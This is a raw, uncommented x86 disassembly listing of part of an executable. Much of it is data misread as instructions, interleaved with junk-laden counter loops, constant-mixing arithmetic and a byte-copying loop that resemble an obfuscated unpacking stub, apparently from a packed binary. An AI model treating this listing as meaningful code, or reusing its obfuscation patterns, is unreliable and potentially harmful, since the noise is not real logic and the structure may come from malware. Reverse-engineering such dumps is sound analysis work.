  410110:	mov    esi,0xc68a43ca
  410115:	push   esp
  410116:	div    DWORD PTR gs:[eax-0x625ae3a5]
  41011d:	push   edi
  41011e:	cli    
  41011f:	mov    bh,0x19
  410121:	outs   dx,DWORD PTR ds:[esi]
  410122:	and    DWORD PTR [edi+0x4],esi
  410125:	sti    
  410126:	pop    edi
  410127:	push   0x79d95e5e
  41012c:	xor    bh,BYTE PTR [ebx+0xcb6b003]
  410132:	mov    eax,ds:0xbcbb70f3
  410137:	jns    0x4101b6
  410139:	ja     0x41011e
  41013b:	xor    al,0xf
  41013d:	inc    edx
  41013e:	jge    0x41010e
  410140:	or     al,0x10
  410142:	into   
  410143:	ins    BYTE PTR es:[edi],dx
  410144:	push   ebp
  410145:	fidivr WORD PTR [ebp-0x51]
  410148:	jl     0x41010f
  41014a:	jp     0x410165
  41014c:	and    DWORD PTR [ebp+0x4c],ebp
  41014f:	pop    edx
  410150:	je     0x4101cb
  410152:	cld    
  410153:	push   cs
  410154:	push   cs
  410155:	pusha  
  410156:	mov    DWORD PTR [edx-0x427a6e93],esi
  41015c:	ss in  al,0xd2
  41015f:	stos   DWORD PTR es:[edi],eax
  410160:	push   edx
  410161:	mov    ds:0x4b23463a,al
  410166:	fisub  WORD PTR [ebx-0x73]
  410169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41016a:	les    edx,FWORD PTR [edx]
  41016c:	push   ebx
  41016d:	fs jg  0x4101d3
  410170:	adc    ebp,DWORD PTR [ebx+edx*4+0x49]
  410174:	in     eax,dx
  410175:	ficomp WORD PTR [ecx+ebx*4-0x50]
  410179:	adc    dl,BYTE PTR [ecx+0x4e]
  41017c:	das    
  41017d:	push   ebx
  41017e:	inc    ebp
  41017f:	adc    dl,BYTE PTR [ebx+0xc]
  410182:	jg     0x410176
  410184:	jmp    FWORD PTR [edx+0x78e8314b]
  41018a:	loop   0x410141
  41018c:	fwait
  41018d:	test   al,0x4b
  41018f:	cld    
  410190:	adc    DWORD PTR [eax],ecx
  410192:	mov    ah,BYTE PTR [edx+ecx*2-0x34]
  410196:	shr    DWORD PTR [eax],0x8e
  410199:	fwait
  41019a:	daa    
  41019b:	lahf   
  41019c:	int    0x28
  41019e:	xchg   edx,eax
  41019f:	mov    edx,0xba831b3e
  4101a4:	fstp   DWORD PTR [ecx]
  4101a6:	xchg   BYTE PTR [ecx-0x73],bh
  4101a9:	ja     0x410160
  4101ab:	jmp    0x41013b
  4101ad:	push   0x8c7d52ac
  4101b2:	mov    al,ds:0xef725776
  4101b7:	(bad)  
  4101b8:	and    BYTE PTR ds:0xf7e64179,ch
  4101be:	push   ss
  4101bf:	dec    ebx
  4101c0:	js     0x4101fd
  4101c2:	sbb    DWORD PTR [edx+0x7d],eax
  4101c5:	jne    0x4101d7
  4101c7:	test   DWORD PTR [eax],edx
  4101c9:	xor    BYTE PTR [edi],bh
  4101cb:	repnz cld 
  4101cd:	mov    edx,0x26a47473
  4101d2:	inc    edx
  4101d3:	inc    edi
  4101d4:	push   ebp
  4101d5:	pop    ss
  4101d6:	(bad)  
  4101d7:	sub    ecx,DWORD PTR [eax]
  4101d9:	dec    edx
  4101da:	out    0xdc,eax
  4101dc:	cmp    DWORD PTR [ecx-0x140fa769],edx
  4101e2:	mov    esi,0x3341e0d2
  4101e7:	repnz mov ebp,0x59c8ae55
  4101ed:	xchg   DWORD PTR [esi-0x30],edi
  4101f0:	int3   
  4101f1:	scas   eax,DWORD PTR es:[edi]
  4101f2:	push   ss
  4101f3:	dec    ebx
  4101f4:	xor    dl,BYTE PTR [ecx]
  4101f6:	or     al,0xf
  4101f8:	lea    ebp,[eax+0x3]
  4101fb:	stc    
  4101fc:	ja     0x410210
  4101fe:	mov    eax,0x21a5d545
  410203:	(bad)  [esi+0x7c]
  410206:	sbb    eax,0x26457e68
  41020b:	mul    ebx
  41020d:	dec    edi
  41020e:	test   BYTE PTR [ebp+0xa09d50a],0x1a
  410215:	loopne 0x41025b
  410217:	lock mov cl,BYTE PTR [ecx+0x3c]
  41021b:	jnp    0x410257
  41021d:	mov    ecx,ss
  41021f:	cmp    ch,BYTE PTR [ebx+0xe4c4faa]
  410225:	pop    edx
  410226:	xchg   edx,eax
  410227:	add    ebx,esi
  410229:	stos   DWORD PTR es:[edi],eax
  41022a:	iret   
  41022b:	or     ecx,DWORD PTR [ebx+0x2953afd4]
  410231:	pop    edi
  410232:	sub    al,0x1f
  410234:	ret    0x841b
  410237:	hlt    
  410238:	push   ss
  410239:	dec    eax
  41023a:	inc    ebx
  41023b:	inc    bx
  41023d:	outs   dx,BYTE PTR ds:[esi]
  41023e:	gs cld 
  410240:	test   al,0x5a
  410242:	add    BYTE PTR [ebx+0x2a4dae5e],cl
  410248:	stc    
  410249:	mov    ebx,0x7d4566de
  41024e:	push   ebx
  41024f:	xlat   BYTE PTR ds:[ebx]
  410250:	jge    0x410291
  410252:	mov    dl,BYTE PTR [ecx-0x38]
  410255:	rcr    edi,cl
  410257:	cli    
  410258:	shr    BYTE PTR [ecx-0x6a759b46],1
  41025e:	push   0xa90673db
  410263:	push   edi
  410264:	xor    al,0xe1
  410266:	jns    0x4101f9
  410268:	adc    BYTE PTR [esi-0x3322090b],bl
  41026e:	mov    DWORD PTR [eax+0x37f09a7b],edx
  410274:	pushf  
  410275:	dec    edx
  410276:	sub    DWORD PTR [edi+0x4],eax
  410279:	ret    0xcffa
  41027c:	mov    dl,0xb5
  41027e:	jns    0x4102fc
  410280:	add    BYTE PTR [edx],bh
  410282:	xor    edi,DWORD PTR [edx+0x48d5ed]
  410288:	inc    edx
  410289:	xchg   esp,eax
  41028a:	push   0xfcf664ac
  41028f:	xchg   ebp,eax
  410290:	hlt    
  410291:	test   al,0xc7
  410293:	in     eax,dx
  410294:	out    0x8b,eax
  410296:	jne    0x410290
  410298:	mov    DWORD PTR ds:0x43386b,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43378f,0x433883
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433793,0x12
  4102c6:	cmp    DWORD PTR ds:0x433793,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433793,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433793,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433793
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433793,eax
  410303:	mov    eax,ds:0x433793
  410308:	dec    eax
  410309:	mov    ds:0x433793,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43378f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43378f
  41036b:	inc    eax
  41036c:	mov    ds:0x43378f,eax
  410371:	cmp    DWORD PTR ds:0x43378f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43378f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43378f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43378f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43378f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43379f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x4337ff,0x43383f
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x4337e7
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x65b22380],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103ed
  4103eb:	call   0x2ac046e1
  4103f0:	or     BYTE PTR [eax+0x54],bh
  4103f3:	enter  0x6444,0xb4
  4103f7:	inc    ebp
  4103f8:	xlat   BYTE PTR ds:[ebx]
  4103f9:	aad    0x7b
  4103fb:	or     bl,ah
  4103fd:	out    0x2d,eax
  4103ff:	inc    edx
  410400:	sub    bl,bl
  410402:	fild   QWORD PTR [esi+0x36]
  410405:	adc    ecx,DWORD PTR [edi+0x8]
  410408:	cmp    edi,DWORD PTR [eax]
  41040a:	sbb    DWORD PTR ds:[eax],ebx
  41040d:	inc    edi
  41040e:	or     eax,0xf9b0df9d
  410413:	mov    al,ds:0x6d58905d
  410418:	mov    edx,0x5df06197
  41041d:	hlt    
  41041e:	lea    esi,[edi-0x591e86d0]
  410424:	mov    eax,cs
  410426:	mov    bl,0xd3
  410428:	mov    al,0xb8
  41042a:	mov    eax,0x33c73eab
  41042f:	pop    edx
  410430:	stc    
  410431:	mov    bl,0x6e
  410433:	dec    ecx
  410434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410435:	dec    ebp
  410436:	sbb    BYTE PTR [esi+0x38976c36],dh
  41043c:	into   
  41043d:	xchg   ecx,eax
  41043e:	pop    ebx
  41043f:	jp     0x4103f9
  410441:	sub    eax,0xf6270f40
  410446:	mov    ebx,gs
  410448:	dec    ecx
  410449:	push   ebp
  41044a:	sbb    eax,0x5a533bf5
  41044f:	mov    ecx,0x4e9e4071
  410454:	mov    edi,esi
  410456:	push   ds
  410457:	cli    
  410458:	clc    
  410459:	inc    edx
  41045a:	(bad)  
  41045b:	adc    eax,0xc32ea277
  410460:	push   edx
  410461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410462:	jmp    DWORD PTR [ecx-0x61]
  410465:	jne    0x410400
  410467:	mov    edx,0xb090c584
  41046c:	into   
  41046d:	call   DWORD PTR [esi]
  41046f:	dec    ebx
  410470:	xor    dl,BYTE PTR fs:[edi-0x57]
  410474:	sub    BYTE PTR [edi+0x4b67ff60],bh
  41047a:	sbb    BYTE PTR [ebp+0x65dfc6ec],cl
  410480:	iret   
  410481:	fs cli 
  410483:	mov    esi,0xc7d2a5cb
  410488:	aas    
  410489:	les    edi,FWORD PTR [edi-0x50]
  41048c:	rol    BYTE PTR [edx],0x19
  41048f:	and    ah,BYTE PTR [edx-0x6f]
  410492:	push   ecx
  410493:	cld    
  410494:	pusha  
  410495:	data16 mov al,ds:0x6e60550c
  41049b:	cmp    al,0x92
  41049d:	stc    
  41049e:	(bad)  
  41049f:	out    dx,eax
  4104a0:	pop    edx
  4104a1:	xchg   edx,eax
  4104a2:	mov    dl,0x6e
  4104a4:	je     0x410446
  4104a6:	lods   eax,DWORD PTR ds:[esi]
  4104a7:	sbb    al,0x8b
  4104a9:	(bad)  
  4104ab:	inc    edx
  4104ac:	xchg   esp,eax
  4104ad:	add    BYTE PTR [esi+edx*8+0x4b518d1a],bh
  4104b4:	adc    al,0xc7
  4104b6:	mov    dh,0x5
  4104b9:	push   ebx
  4104ba:	mov    esp,0x769293eb
  4104bf:	mov    eax,ds:0x30ccc79d
  4104c4:	push   esp
  4104c5:	call   0x7641:0x3d0bea96
  4104cc:	mov    eax,ds:0x67f72949
  4104d1:	push   0xe6d5e65e
  4104d6:	retf   
  4104d7:	cdq    
  4104d8:	push   esi
  4104d9:	push   0xfffffffb
  4104db:	push   ds
  4104dc:	scas   al,BYTE PTR es:[edi]
  4104dd:	outs   dx,DWORD PTR ds:[esi]
  4104de:	lods   eax,DWORD PTR ds:[esi]
  4104df:	fwait
  4104e0:	inc    ebx
  4104e1:	fidiv  DWORD PTR ds:0xe2f187eb
  4104e7:	push   esi
  4104e8:	into   
  4104e9:	mov    eax,fs
  4104eb:	pop    es
  4104ec:	pop    es
  4104ed:	adc    al,0xae
  4104ef:	(bad)  
  4104f0:	int3   
  4104f1:	test   BYTE PTR [edx+0x5d],ah
  4104f4:	das    
  4104f5:	jbe    0x410508
  4104f7:	add    dh,BYTE PTR [esi+0x2896e311]
  4104fd:	or     BYTE PTR [ecx+0x12],0x19
  410501:	mov    dx,0xbb59
  410505:	jne    0x410568
  410507:	dec    eax
  410508:	idiv   DWORD PTR [eax-0x47]
  41050b:	mov    esi,0x6796c656
  410510:	jae    0x410591
  410512:	imul   ecx,DWORD PTR [eax+0x71581ed9],0x46fb349
  41051c:	arpl   cx,ax
  41051e:	add    al,0xdb
  410520:	push   esi
  410522:	(bad)  
  410523:	cmp    BYTE PTR [edx+0x52f4f0e1],ah
  410529:	push   esi
  41052a:	lods   eax,DWORD PTR ds:[esi]
  41052b:	mov    es,WORD PTR [ebx+ebp*2+0x3f]
  41052f:	sbb    bh,BYTE PTR [edx+eiz*4+0xf]
  410533:	jo     0x410512
  410535:	adc    BYTE PTR [ecx+eax*4+0x6c],0x99
  41053a:	out    dx,eax
  41053b:	jo     0x4105b4
  41053d:	lods   al,BYTE PTR ds:[esi]
  41053e:	adc    DWORD PTR [ecx-0x41],0xffffff80
  410542:	mov    fs,ebx
  410544:	xchg   edi,eax
  410545:	fld    TBYTE PTR ss:[edi-0x4b0d59b9]
  41054c:	icebp  
  41054d:	jg     0x4105a2
  41054f:	pop    edx
  410550:	xor    bh,BYTE PTR [ebx+0x5a]
  410553:	enter  0xc12a,0x4f
  410557:	sbb    ch,cl
  410559:	lahf   
  41055a:	stos   BYTE PTR es:[edi],al
  41055b:	and    DWORD PTR ds:0x6d8aaa52,edx
  410561:	jmp    0xa177:0xa9886160
  410568:	cli    
  410569:	jecxz  0x41058f
  41056b:	xchg   edi,eax
  41056c:	push   esi
  41056d:	ss or  al,0xf7
  410570:	call   0xdb1a343c
  410575:	add    eax,0xba58c0c2
  41057a:	loop   0x410503
  41057c:	or     al,0xb8
  41057e:	icebp  
  41057f:	lods   al,BYTE PTR ds:[esi]
  410580:	not    esp
  410582:	shr    DWORD PTR [eax],cl
  410584:	jb     0x41057f
  410586:	add    BYTE PTR [eax-0x6c],bh
  410589:	jnp    0x41058d
  41058b:	ja     0x41052f
  41058d:	mov    DWORD PTR [esi-0x5992aae6],esi
  410593:	mov    ecx,0xc1acea84
  410598:	mov    bl,0xb7
  41059a:	mov    esi,0x5d9846c
  41059f:	clc    
  4105a0:	xchg   ebx,eax
  4105a1:	dec    eax
  4105a2:	sbb    dh,BYTE PTR [esi+0x2f]
  4105a5:	xchg   ebp,eax
  4105a6:	add    BYTE PTR [edx+0x4b],0x7a
  4105aa:	push   0xffffffca
  4105ac:	and    BYTE PTR [ecx+0x15],dl
  4105af:	jmp    0x8eb98a
  4105b4:	out    0xc,al
  4105b6:	xchg   edx,eax
  4105b7:	mov    eax,0xf300ea4e
  4105bc:	xchg   edi,eax
  4105bd:	outs   dx,BYTE PTR ds:[esi]
  4105be:	lahf   
  4105bf:	xor    BYTE PTR [eiz*4-0x14e3a14],bh
  4105c6:	pop    edi
  4105c7:	mov    dh,0xfc
  4105c9:	sahf   
  4105ca:	cli    
  4105cb:	lahf   
  4105cc:	stc    
  4105cd:	jecxz  0x41058e
  4105cf:	jno    0x410588
  4105d1:	add    DWORD PTR [ebx-0x4e],esp
  4105d4:	repz push 0xffffff8e
  4105d7:	xor    ecx,DWORD PTR [ebp-0x21fece9f]
  4105dd:	xchg   ebp,eax
  4105de:	cmp    al,0x24
  4105e0:	mov    ebp,0x7617638
  4105e5:	or     eax,0x776770c4
  4105ea:	sbb    edx,0x9270ba57
  4105f0:	out    0x8b,al
  4105f2:	add    eax,0x3a64f327
  4105f7:	call   0x37af758a
  4105fc:	xchg   al,ch
  4105fe:	xchg   DWORD PTR [edi+0x65e6115a],esi
  410604:	fcom   DWORD PTR [ebx+0x4d5926c2]
  41060a:	and    al,0x50
  41060c:	sahf   
  41060d:	cmp    BYTE PTR [edx+0x7a794923],dh
  410613:	push   cs
  410614:	xchg   DWORD PTR [eax-0x6914187f],ebx
  41061a:	xor    cl,BYTE PTR [edx-0x4d]
  41061d:	pop    ebp
  41061e:	loopne 0x410616
  410620:	pop    es
  410621:	rcr    bl,1
  410623:	and    ebx,eax
  410625:	or     cl,BYTE PTR [ecx+0x49]
  410628:	xchg   edx,eax
  410629:	push   edi
  41062a:	sbb    DWORD PTR [edi],0x861ea1c
  410630:	jmp    0xbb970ed7
  410635:	shl    BYTE PTR [ecx+ebx*2-0x4b],0xae
  41063a:	pop    edi
  41063b:	mul    DWORD PTR gs:[esi-0x24]
  41063f:	enter  0xbfdb,0x37
  410643:	in     al,dx
  410644:	mov    cl,0x5
  410646:	pop    ecx
  410647:	sar    BYTE PTR [ebx+eax*4+0x36622137],1
  41064e:	mov    esp,0x398de876
  410653:	idiv   di
  410656:	or     al,0x8
  410658:	fist   WORD PTR [ebp-0x66]
  41065b:	jbe    0x41062d
  41065d:	stos   DWORD PTR es:[edi],eax
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433793,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433793
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433793,edx
  41067c:	cmp    DWORD PTR ds:0x433793,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433793,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x43386f
  4106a7:	sbb    edx,DWORD PTR ds:0x43379b
  4106ad:	mov    DWORD PTR ds:0x43386f,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x4337b3,0x17
  4106c0:	cmp    DWORD PTR ds:0x4337b3,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x4337b3,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x43397c
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x4337b3,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x4337b3
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x4337b3,ecx
  410708:	mov    ecx,DWORD PTR ds:0x4337b3
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x4337b3,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x433873,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x433837,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433797,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x4337a7,0x43382b
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	cmc    
  4107d5:	xchg   ecx,eax
  4107d6:	mov    edi,edi
  4107d8:	xchg   ecx,eax
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	dec    esi
  4107e1:	(bad)  
  4107e2:	xor    edx,DWORD PTR [esi-0xff8579e]
  4107e8:	les    ebp,FWORD PTR [edi+0x35]
  4107eb:	neg    BYTE PTR [edx]
  4107ed:	nop
  4107ee:	test   al,0x53
  4107f0:	call   0xb963489a
  4107f5:	(bad)  
  4107f6:	ret    0x95b8
  4107f9:	je     0x4107ee
  4107fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107fc:	push   ebx
  4107fd:	adc    DWORD PTR [edi],0xa405ab14
  410803:	(bad)  
  410804:	push   eax
  410805:	test   al,0xd6
  410807:	xchg   ecx,eax
  410808:	stc    
  410809:	pop    ecx
  41080a:	fcmovu st,st(6)
  41080c:	daa    
  41080d:	fmul   QWORD PTR [ecx-0x236ed0f2]
  410813:	(bad)  [eax+0x6ad9fe48]
  410819:	out    0xbe,eax
  41081b:	mov    ebp,0x9c1b2b6e
  410820:	fidivr DWORD PTR fs:[ecx]
  410823:	shl    DWORD PTR [esi+0x571f191e],cl
  410829:	inc    edi
  41082a:	sbb    eax,0x12e8719b
  41082f:	xchg   ebx,eax
  410830:	add    BYTE PTR [edi],cl
  410832:	mov    ah,0x26
  410834:	outs   dx,DWORD PTR ds:[esi]
  410835:	ret    
  410836:	xor    edi,DWORD PTR ds:0x10b9974e
  41083c:	inc    edx
  41083d:	jmp    0x516:0x494f4024
  410844:	mov    cl,0x93
  410846:	adc    al,0x61
  410848:	jl     0x41089c
  41084a:	pop    es
  41084b:	xchg   DWORD PTR [edi],ecx
  41084d:	sbb    ebp,DWORD PTR [edx-0x7b]
  410850:	cmp    bl,BYTE PTR [edi]
  410852:	sbb    al,0x33
  410854:	xor    esp,DWORD PTR [eax-0x1f]
  410857:	inc    edi
  410858:	out    dx,eax
  410859:	sbb    BYTE PTR [eax+0x72],bh
  41085c:	out    dx,eax
  41085d:	and    ebx,edx
  41085f:	jge    0x410820
  410861:	jl     0x410800
  410863:	rcl    BYTE PTR [edx+ecx*1+0x4cdbc184],cl
  41086a:	setb   BYTE PTR [ecx+edi*1]
  41086e:	push   ds
  41086f:	lea    edi,[eax]
  410871:	in     al,dx
  410872:	push   esi
  410873:	rol    esi,1
  410875:	sub    eax,0x73adab88
  41087a:	jmp    0x50f1:0xfed25bac
  410881:	in     eax,0x6f
  410883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410884:	push   es
  410885:	mov    esp,0xd2510b57
  41088a:	aam    0x75
  41088c:	adc    dh,0x19
  41088f:	xor    edx,esi
  410891:	push   edx
  410892:	or     al,0xd
  410894:	xor    DWORD PTR [edi-0x30],0x71657135
  41089b:	ins    BYTE PTR es:[edi],dx
  41089c:	ror    BYTE PTR ds:0x7406446f,1
  4108a2:	mov    DWORD PTR [ebx-0x5c],ebp
  4108a5:	daa    
  4108a6:	xchg   esp,eax
  4108a7:	lds    edx,FWORD PTR [eax+ebp*1]
  4108aa:	cmp    BYTE PTR [ecx-0x6f],dl
  4108ad:	fcompp 
  4108af:	xchg   edx,eax
  4108b0:	loop   0x4108b0
  4108b2:	xchg   edx,eax
  4108b3:	aas    
  4108b4:	fadd   DWORD PTR [edx]
  4108b6:	mov    esi,0xe917b0bc
  4108bb:	hlt    
  4108bc:	mov    cl,0xe8
  4108be:	stc    
  4108bf:	outs   dx,DWORD PTR ds:[esi]
  4108c0:	aam    0x8b
  4108c2:	ret    0xfaae
  4108c5:	jae    0x410921
  4108c7:	data16 mov dl,0x71
  4108ca:	push   0x97f4e101
  4108cf:	leave  
  4108d0:	pop    edx
  4108d1:	dec    ecx
  4108d2:	push   DWORD PTR [edx+0x7104b276]
  4108d8:	lahf   
  4108d9:	inc    ecx
  4108da:	stc    
  4108db:	jecxz  0x41092b
  4108dd:	push   edx
  4108de:	imul   BYTE PTR [esi+0x4e]
  4108e1:	scas   eax,DWORD PTR es:[edi]
  4108e2:	sti    
  4108e3:	xchg   edx,eax
  4108e4:	mov    ebp,0xa96c6b72
  4108e9:	test   eax,0xc43949c
  4108ee:	dec    ebp
  4108ef:	cmp    BYTE PTR [ebx+edi*8-0x38e0a200],bh
  4108f6:	call   0xf1d:0xe93b6acf
  4108fd:	inc    ebx
  4108fe:	sub    DWORD PTR [eax-0x4d],eax
  410901:	or     ah,BYTE PTR [edi-0x1e]
  410904:	mov    edi,DWORD PTR fs:[ebx-0x7a]
  410908:	xchg   ecx,eax
  410909:	adc    bh,bl
  41090b:	adc    DWORD PTR [esi-0x28],esp
  41090e:	dec    edi
  41090f:	jl     0x41098e
  410911:	or     edi,eax
  410913:	rol    BYTE PTR [ebx-0x19511ac2],0xcb
  41091a:	pop    ebx
  41091b:	pop    ss
  41091c:	xchg   al,al
  41091e:	xchg   ecx,eax
  41091f:	cwde   
  410920:	sub    bh,bh
  410922:	int    0x56
  410924:	mov    dh,BYTE PTR [eax-0x50ae28]
  41092a:	mov    ds:0x64963dba,al
  41092f:	mov    dh,0x9a
  410931:	cmp    edi,eax
  410933:	enter  0x75ac,0x86
  410937:	addr16 jp 0x41094f
  41093a:	out    0xb5,eax
  41093c:	enter  0xff34,0xbc
  410940:	test   al,0x8f
  410942:	sub    dh,BYTE PTR [ebx]
  410944:	popa   
  410945:	nop
  410946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410947:	dec    eax
  410948:	dec    edi
  410949:	mov    ch,0x42
  41094b:	adc    cl,BYTE PTR [edx]
  41094d:	sahf   
  41094e:	loope  0x4109bf
  410950:	cwde   
  410951:	xchg   edi,eax
  410952:	iret   
  410953:	(bad)  
  410954:	shr    DWORD PTR [edx-0x1d8fec61],1
  41095a:	xchg   DWORD PTR [ecx-0x3e],ebp
  41095d:	add    ch,BYTE PTR [esi+0x8c40fd4]
  410963:	sbb    DWORD PTR [edx+0x73],ebx
  410966:	sbb    DWORD PTR [eax-0x6a],edx
  410969:	push   esi
  41096a:	fbld   TBYTE PTR [edi-0x5911154f]
  410970:	jp     0x410951
  410972:	repnz (bad) 
  410974:	ins    BYTE PTR es:[edi],dx
  410975:	mov    dl,BYTE PTR [edx-0x1c]
  410978:	cwde   
  410979:	mov    eax,ds:0x4d66ad97
  41097e:	sbb    DWORD PTR [eax],edx
  410980:	and    BYTE PTR [edi],ch
  410982:	ror    DWORD PTR [ebx+0x574fa0d7],0xc1
  410989:	push   cs
  41098a:	inc    ebp
  41098b:	jl     0x410922
  41098d:	cmp    bh,bh
  41098f:	mul    DWORD PTR [ecx+0x6fd1cfa6]
  410995:	sub    dl,BYTE PTR [eax-0x50]
  410998:	jmp    0x1fd33c20
  41099d:	in     eax,0x87
  41099f:	rcr    BYTE PTR [ebx],0xe0
  4109a2:	add    eax,0xea74717c
  4109a7:	fs or  ch,cl
  4109aa:	sbb    DWORD PTR ss:[edi+0x3714d20c],ebp
  4109b1:	cwde   
  4109b2:	mov    eax,ds:0x437a874f
  4109b7:	popf   
  4109b8:	xor    al,0x7d
  4109ba:	inc    ebx
  4109bb:	or     eax,0x2716679d
  4109c0:	inc    ebx
  4109c1:	aad    0x54
  4109c3:	jmp    0xb5c8:0x41e08710
  4109ca:	loop   0x410989
  4109cc:	inc    ecx
  4109cd:	xchg   ebx,eax
  4109ce:	fwait
  4109cf:	outs   dx,BYTE PTR ds:[esi]
  4109d0:	xchg   ebx,eax
  4109d1:	outs   dx,DWORD PTR fs:[esi]
  4109d3:	mov    ds:0xc0e58379,eax
  4109d8:	jae    0x4109f4
  4109da:	imul   DWORD PTR [ebp+0x21633834]
  4109e0:	int3   
  4109e1:	cld    
  4109e2:	js     0x410964
  4109e4:	mov    DWORD PTR [eax],ecx
  4109e6:	in     eax,dx
  4109e7:	mov    edx,0x13ca0071
